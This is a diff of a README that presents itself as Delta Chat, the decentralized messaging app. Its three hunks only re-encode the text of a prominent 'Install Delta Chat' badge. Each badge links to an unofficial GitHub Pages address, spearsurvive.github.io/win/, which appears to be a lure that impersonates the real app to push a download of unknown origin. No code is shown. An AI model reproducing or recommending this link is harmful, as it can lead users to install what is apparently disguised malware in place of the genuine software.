@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta%20Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta+Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Delta Chat is a decentralized messaging app that works over email infrastructure
 
 <div align="center">
 
-[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta%20Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta+Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Delta Chat is a decentralized messaging app that works over email infrastructure
 
 <div align="center">
 
-[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta%20Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Delta Chat](https://img.shields.io/badge/⬇_Install_Delta+Chat-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
